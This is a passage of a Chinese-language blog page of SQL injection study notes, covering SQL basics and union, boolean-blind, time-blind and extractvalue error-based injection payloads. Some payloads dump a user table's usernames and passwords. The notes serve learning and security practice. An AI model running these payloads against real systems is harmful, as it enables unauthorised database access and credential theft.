@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sql注入笔记@Biscuit19 | 月明星稀</title><meta name="author" content="lhl_2507"><meta name="copyright" content="lhl_2507"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入笔记​    被迫转web了，总结一下sql注入吧，笔记源于@**Biscuit19_**； 0x01 sql基础一、插入更新删除1234567CREATE TABLE table_name (column_name column_type);insert into tb_name (column1,column2,column3,...) values (value1,value2,v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入笔记@Biscuit19">
+<meta property="og:url" content="https://lhl7.github.io/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="月明星稀">
+<meta property="og:description" content="sql注入笔记​    被迫转web了，总结一下sql注入吧，笔记源于@**Biscuit19_**； 0x01 sql基础一、插入更新删除1234567CREATE TABLE table_name (column_name column_type);insert into tb_name (column1,column2,column3,...) values (value1,value2,v">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://lhl7.github.io/img/index.jpg">
+<meta property="article:published_time" content="2022-04-14T14:10:59.715Z">
+<meta property="article:modified_time" content="2022-04-14T14:10:41.292Z">
+<meta property="article:author" content="lhl_2507">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lhl7.github.io/img/index.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lhl7.github.io/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql注入笔记@Biscuit19',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-14 22:10:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">44</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">月明星稀</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入笔记@Biscuit19</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-04-14T14:10:59.715Z" title="Created 2022-04-14 22:10:59">2022-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-04-14T14:10:41.292Z" title="Updated 2022-04-14 22:10:41">2022-04-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql注入笔记@Biscuit19"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><p>​    被迫转web了，总结一下sql注入吧，笔记源于@**Biscuit19_**；</p>
+<h2 id="0x01-sql基础"><a href="#0x01-sql基础" class="headerlink" title="0x01 sql基础"></a>0x01 sql基础</h2><h3 id="一、插入更新删除"><a href="#一、插入更新删除" class="headerlink" title="一、插入更新删除"></a>一、插入更新删除</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_name (column1,column2,column3,...) <span class="keyword">values</span> (value1,value2,value3,...);</span><br><span class="line"></span><br><span class="line">update tb_name <span class="keyword">set</span> 字段<span class="number">1</span> <span class="operator">=</span> 新值,字段<span class="number">2</span> <span class="operator">=</span> 新值,  <span class="keyword">where</span> 字段 <span class="operator">=</span> 某值；</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_name <span class="keyword">where</span> 列名称 <span class="operator">=</span> 某值；</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、常用到的通用字段"><a href="#二、常用到的通用字段" class="headerlink" title="二、常用到的通用字段"></a>二、常用到的通用字段</h3><p><strong>information_schema</strong>是整个数据库</p>
+<p>information_schema里的表：</p>
+<ul>
+<li><strong>information_schema.schemata</strong>为所有数据库信息，包含：<ul>
+<li>其中的字段：</li>
+<li><strong>schema_name</strong>: 所有数据库名</li>
+</ul>
+</li>
+<li><strong>information_schema.tables</strong>为所有表的信息，包含：<ul>
+<li>其中的字段：</li>
+<li><strong>table_schema</strong>: 表所在的数据库名</li>
+<li><strong>table_rows</strong>表的行数（有多少条数据）</li>
+<li><strong>table_name</strong> 记录数据表名</li>
+</ul>
+</li>
+<li><strong>information_schema.columns</strong>为所有字段的信息，包含：<ul>
+<li>其中的字段： </li>
+<li><strong>column_name</strong>字段名</li>
+<li><strong>table_name</strong>   字段所在的表名（用于条件查询）</li>
+<li><strong>table_schema</strong> 字段所在数据库名（用于条件查询）</li>
+<li><strong>column_type</strong> 字段类型</li>
+</ul>
+</li>
+</ul>
+<h3 id="三、常用语法："><a href="#三、常用语法：" class="headerlink" title="三、常用语法："></a>三、常用语法：</h3><h4 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h4><p>在最基础的查询语句中，我们直接使用如下语法进行查询，并使用where作为条件限制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> field1,field2,...fieldn... <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Order-by"><a href="#2-Order-by" class="headerlink" title="2.Order by"></a>2.Order by</h4><h5 id="order-by-字段名（列名"><a href="#order-by-字段名（列名" class="headerlink" title="order by 字段名（列名"></a>order by 字段名（列名</h5><p>进一步的，我们为了更好的排序输出结果，可以用orderby来控制结果的排序（asc为顺序，desc为逆序）：</p>
+<p>select * from 表名 [where 条件] [ order by  field1 [desc/asc],field2 [desc/asc]… ];</p>
+<p>举个例子：</p>
+<p>​    以逆字母顺序显示公司名称，并以数字顺序显示顺序号：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span>, OrderNumber <span class="keyword">ASC</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="order-by-数字"><a href="#order-by-数字" class="headerlink" title="order by 数字"></a>order by 数字</h5><p>含义：order by+列名 就是按某一列的排序进行查找,默认升序, 加数字就是第几列的意思，如下</p>
+<p>sql语句中order by 1或者order by 2…order by N</p>
+<p>其实1表示第一个字段,2表示第二个字段; </p>
+<p>依此类推,当表中只有2个栏位时,order by 3就会出错, 所以就说明列表只有2个字段, 是用来报字段名的</p>
+<h4 id="3-limit"><a href="#3-limit" class="headerlink" title="3.limit"></a>3.limit</h4><p>**!!!从0开始!!! **</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> LIMIT [<span class="keyword">offset</span>,] <span class="keyword">rows</span> <span class="operator">|</span> <span class="keyword">rows</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span></span><br></pre></td></tr></table></figure>
+
+<p>第一个参数指定从第几行开始查，第二个参数指定要查几行。<strong>初始记录行的偏移量是 0(而不是 1)</strong></p>
+<p>举个例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>,<span class="number">10</span>; # 检索记录行 <span class="number">6</span><span class="number">-15</span>\<span class="operator">*</span></span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>; #检索前 <span class="number">5</span> 个记录行\<span class="operator">*</span>（<span class="number">0</span><span class="number">-4</span>）</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 limit n<span class="number">-1</span>,<span class="number">1</span>; #查询第n行</span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">95</span>,<span class="number">-1</span>; #检索记录行 <span class="number">96</span><span class="operator">-</span>last.\<span class="operator">*</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-UNION-联合查询"><a href="#4-UNION-联合查询" class="headerlink" title="4.UNION(联合查询)"></a>4.UNION(联合查询)</h4><ul>
+<li>UNION必须由两条或两条以上的SELECT语句组成，语句之间用关键字UNION分隔</li>
+<li>UNION中的每个查询必须包含相同的列，然后会将这两个结果通过这个相同的列链接起来。</li>
+<li>UNION会从查询结果集中自动去除了重复行，UNION ALL不会。</li>
+</ul>
+<h4 id="5-concat-ws-函数"><a href="#5-concat-ws-函数" class="headerlink" title="5.concat_ws()函数"></a>5.concat_ws()函数</h4><p>简单的说，就是一个字符串连接函数：</p>
+<ol>
+<li><p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符;（concat_ws就是concat with separator）</p>
+</li>
+<li><p>语法：concat_ws(separator, str1, str2, …)</p>
+</li>
+</ol>
+<p>举个例子</p>
+<p>SELECT CONCAT_WS(‘,’,’First name’,NULL,’Last Name’);返回结果为<br>+———————————————-+<br>| CONCAT_WS(‘,’,’First name’,NULL,’Last Name’) |<br>+———————————————-+<br>| First name,Last Name             |#可以看到通过逗号分隔了<br>+———————————————-+e</p>
+<p>**concat()**和它一样，只不过是少了分隔符，就是单纯的多个字符串连接成一个字符串</p>
+<h4 id="6-group-concat（-concat-ws）"><a href="#6-group-concat（-concat-ws）" class="headerlink" title="6.group_concat（+concat_ws）"></a>6.group_concat（+concat_ws）</h4><ol>
+<li><p>功能：把查询到的很多行合成一行来写</p>
+</li>
+<li><p>语法：group_concat( [distinct] str1,str2… [order by 排序字段 asc/desc ] [separator ‘分隔符’] ):</p>
+</li>
+</ol>
+<p>默认就是以 ，为分隔符</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(mk_username,mk_password)) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到:</span><br><span class="line">test5111111,test6111111,test7111111</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(concat_ws(<span class="string">&#x27;,&#x27;</span>,mk_username,mk_password))) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到：</span><br><span class="line">test5,<span class="number">111111</span>,test6,<span class="number">111111</span>,<span class="number">11111</span>,<span class="number">1111111111</span>,test7,<span class="number">1111111</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-常用语句"><a href="#0x02-常用语句" class="headerlink" title="0x02 常用语句"></a>0x02 常用语句</h2><h3 id="一、爆数据库信息常用语句"><a href="#一、爆数据库信息常用语句" class="headerlink" title="一、爆数据库信息常用语句"></a>一、爆数据库信息常用语句</h3><h4 id="1-用户数据库版本，管理员用户名及数据库名字"><a href="#1-用户数据库版本，管理员用户名及数据库名字" class="headerlink" title="1.用户数据库版本，管理员用户名及数据库名字"></a>1.用户数据库版本，管理员用户名及数据库名字</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),<span class="keyword">user</span>(),<span class="number">5</span>,database()</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-爆所有数据库名："><a href="#2-爆所有数据库名：" class="headerlink" title="2.爆所有数据库名："></a>2.爆所有数据库名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-爆某数据库中的所有表名："><a href="#3-爆某数据库中的所有表名：" class="headerlink" title="3.爆某数据库中的所有表名："></a>3.爆某数据库中的所有表名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</strong><br>类似TABLE_SCHEMA=0x674657374</p>
+<h4 id="4-爆某数据库中某表的所有字段名："><a href="#4-爆某数据库中某表的所有字段名：" class="headerlink" title="4.爆某数据库中某表的所有字段名："></a>4.爆某数据库中某表的所有字段名：</h4><p>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA=’数据库名’and TABLE_NAME=’表名’</p>
+<h4 id="5-爆某表中的所有信息，用逗号分隔"><a href="#5-爆某表中的所有信息，用逗号分隔" class="headerlink" title="5.爆某表中的所有信息，用逗号分隔"></a>5.爆某表中的所有信息，用逗号分隔</h4><p>select GROUP_CONCAT(concat_ws(‘,’,st1,st2…)) FROM 数据库名.表名</p>
+<p>、</p>
+<h2 id="0x03-常见注入类型"><a href="#0x03-常见注入类型" class="headerlink" title="0x03 常见注入类型"></a>0x03 常见注入类型</h2><h3 id="一、字符型注入-判断引号闭合"><a href="#一、字符型注入-判断引号闭合" class="headerlink" title="一、字符型注入,判断引号闭合:"></a>一、字符型注入,判断引号闭合:</h3><p>‘ or ‘1’=’1</p>
+<p>“ or “1”=”1</p>
+<p>原理:</p>
+<p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or ‘1’=’1’</strong></p>
+<h3 id="二、注释型注入"><a href="#二、注释型注入" class="headerlink" title="二、注释型注入"></a>二、注释型注入</h3><p>‘or 1=1 #</p>
+<p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or 1=1 #’</strong></p>
+<p>Biscuit19_’ or 1=1 #</p>
+<p><strong>select * from mk_users where mk_username=’Biscuit19_’ or 1=1 #’ and mk_password=’123334’</strong></p>
+<p><strong>没有显示位</strong></p>
+<h3 id="三、union注入"><a href="#三、union注入" class="headerlink" title="三、union注入"></a>三、union注入</h3><p>{“userName”:”Biscuit19_”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select 1,2,3,4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p> <strong>用来合并两个或多个 SELECT 语句的结果集</strong></p>
+<p>select <strong>dir_name</strong> as FileName,<strong>dir_type</strong> as FileType,<strong>update_time</strong> as<br>    RecentEditTime,<strong>creator_name</strong> as Creater from file_dir where creator_name=’Biscuit19_’ <strong>union select 1,2,3,4</strong> #’</p>
+<p>多了一个元组</p>
+<p>{“userName”:”Biscuit19_’ union select database(),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’demouser’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=’demouser’and TABLE_NAME=’mk_users’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<p>{“userName”:”Biscuit19_’ union select (select GROUP_CONCAT(concat_ws(‘,’,mk_id,mk_username,mk_password,mk_email,mk_enabled,create_time,update_time)) FROM demouser.mk_users),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p>
+<h3 id="四、布尔盲注"><a href="#四、布尔盲注" class="headerlink" title="四、布尔盲注"></a>四、布尔盲注</h3><p>页面在执行sql语句后，只会显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。</p>
+<p>注意：布尔盲注是逻辑运算而不是输出值，所以and后面接的是逻辑表达式；还有，必须select出来结果才能比较</p>
+<p>1=1 是没有结果的</p>
+<p>SELECT 1=1 才有结果，结果是1（true），这里指的是函数（）需要select 出来比较，而不是说1=1就没有结果，1=1的结果就是true，这句话的意思就是这种函数得到的值要select出来才可以</p>
+<p>(select length(database())=3)</p>
+<h4 id="1-所用函数"><a href="#1-所用函数" class="headerlink" title="1.所用函数"></a>1.所用函数</h4><h5 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h5><p>函数可返回字符串的长度，用于碰撞出数据库名字的长度。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params">database(</span>))</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h5><p>substring()函数可以截取字符串，可指定开始的位置和截取的长度，用于进一步剪切。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">1</span>,<span class="number">3</span></span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">2</span>,<span class="number">1</span></span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>substring的第一位是1，不是0，所以至少从1开始</p>
+<h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ord()函数可以返回单个字符的ASCII码</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params">database(</span>),1,1)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">ord</span>(<span class="params">substring(database(</span>),1,1))</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此，通过(select ord(substring(database(),1,1))=31)这样的语句反复碰撞，就能得到数据库名！</p>
+<p>即只需要和这些字符的ASCII值进行比较：</p>
+<p>0-9：48-57          _：95<br>A-Z：65-91         a-z：97-122</p>
+<p>全查：33-126</p>
+<h4 id="2-手工注入"><a href="#2-手工注入" class="headerlink" title="2 手工注入"></a>2 手工注入</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>因为<strong>sql执行失败和未查到数据都会返回False</strong>，所以只能通过返回的逻辑值来判断，如果有类似如下这种情况，则存在布尔盲注</p>
+<p>也可以通过sleep(3)来试试，看看会不会停止3s，如果停止了，说明后面的语句也执行了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 整型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="literal">true</span> </span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> flase</span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>注意！当你连一个正确的参数都没有的时候，你要直接闭合然后把and改成or来判断，此时前一个条件为false，用or后面来决定对错，where username=’’ or 1=1 /1=2 如:</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_name=<span class="string">&#x27; or 1=1 # </span></span><br><span class="line"><span class="string">user_name=&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1 </span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="五、时间盲注"><a href="#五、时间盲注" class="headerlink" title="五、时间盲注"></a>五、时间盲注</h3><p>基本上和布尔盲注是一样的。</p>
+<p>{“username”:”Biscuit19_’ and if(1=1,sleep(3),1) #”,”password”:” “}</p>
+<p><strong>select * from mk_users where mk_username=’Biscuit19_’ and if(1=1,sleep(1),1) #’ and mk_password=’ ‘</strong></p>
+<h3 id="六、报错注入"><a href="#六、报错注入" class="headerlink" title="六、报错注入"></a>六、报错注入</h3><h4 id="ExtractValue-报错注入"><a href="#ExtractValue-报错注入" class="headerlink" title="ExtractValue()报错注入"></a>ExtractValue()报错注入</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>需要注意，extractvalue()能查询字符串的最大长度为32，</p>
+<p><strong>报错原理</strong></p>
+<p>例如</p>
+<p><code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p>
+<p>​    也就是说，我们在第二个参数里输出的错误信息会原封不动的报错报出来，所以我们就通过这个来执行注入（当显示位）。</p>
+<p><strong>约束条件</strong><br>输出字符长度限制为32个字符，可以用MID函数等操作</p>
+<p><strong>注入语句</strong><br>and extractvalue(null,concat(0x7e,(代码操作),0x7e))</p>
+<p>（这里的0x7e是 ~ 波浪号，只是为了好看）</p>
+<p><strong>举例</strong><br>select * from users where id and extractvalue(null,concat(0x7e,(select version()),0x7e));</p>
+<h5 id="MID函数"><a href="#MID函数" class="headerlink" title="MID函数"></a>MID函数</h5><blockquote>
